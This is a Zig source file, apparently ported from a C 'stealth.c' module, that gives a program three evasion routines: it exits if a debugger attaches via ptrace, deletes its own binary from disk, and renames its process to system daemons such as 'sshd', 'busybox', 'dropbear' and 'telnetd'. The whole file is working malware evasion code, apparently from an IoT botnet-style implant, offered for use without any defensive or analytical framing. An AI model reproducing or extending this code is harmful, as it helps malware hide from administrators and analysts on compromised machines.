//! # Stealth Module
//!
//! Anti-debug, self-delete, and process masquerading.
//!
//! ## C Reference: modules/system/stealth/stealth.c (91 lines)

const std = @import("std");
const posix = std.posix;

// ============================================================
// PTRACE CONSTANTS (Linux-only)
// ============================================================

const PTRACE_TRACEME: c_int = 0;

// ============================================================
// FAKE PROCESS NAMES (from C: stealth.c lines 21-28)
// ============================================================

const fake_names = [_][]const u8{
    "httpd",
    "/usr/sbin/sshd",
    "/bin/busybox",
    "dropbear",
    "telnetd",
    "syslogd",
};

// ============================================================
// STEALTH INIT (from C: stealth.c stealth_init lines 81-90)
// ============================================================

pub fn init(argv: [][*:0]u8) void {
    antiDebug();
    selfDelete(argv);
    disguiseProcess(argv);
}

// ============================================================
// ANTI-DEBUG (from C: stealth.c anti_debug lines 30-41)
// ============================================================

fn antiDebug() void {
    // Linux-only: use ptrace syscall directly
    const native = @import("builtin").target.os.tag;
    if (native != .linux) return;

    // Syscall for ptrace TRACEME
    const linux = std.os.linux;
    const result = linux.syscall4(.ptrace, 0, 0, 0, 0); // PTRACE_TRACEME = 0
    if (@as(isize, @bitCast(result)) == -1) {
        posix.exit(0);
    }
}

// ============================================================
// SELF DELETE (from C: stealth.c self_delete lines 43-51)
// ============================================================

fn selfDelete(argv: [][*:0]u8) void {
    if (argv.len > 0) {
        const path = std.mem.span(argv[0]);
        _ = std.fs.cwd().deleteFile(path) catch {};
    }
}

// ============================================================
// PROCESS DISGUISE (from C: stealth.c disguise_process lines 55-79)
// ============================================================

fn disguiseProcess(argv: [][*:0]u8) void {
    if (argv.len == 0) return;

    // Pick random fake name
    var rng = std.Random.DefaultPrng.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));
    const random = rng.random();
    const name = fake_names[random.intRangeAtMost(usize, 0, fake_names.len - 1)];

    // prctl(PR_SET_NAME, name)
    const PR_SET_NAME = 15;
    var prctl_name: [16]u8 = undefined;
    const copy_len = @min(name.len, 15);
    @memcpy(prctl_name[0..copy_len], name[0..copy_len]);
    prctl_name[copy_len] = 0;

    _ = std.os.linux.prctl(PR_SET_NAME, @intFromPtr(&prctl_name), 0, 0, 0);

    // Overwrite argv[0]
    const orig = std.mem.span(argv[0]);
    const write_len = @min(name.len, orig.len);
    @memcpy(orig[0..write_len], name[0..write_len]);

    // Zero the rest
    if (write_len < orig.len) {
        @memset(orig[write_len..], 0);
    }
}
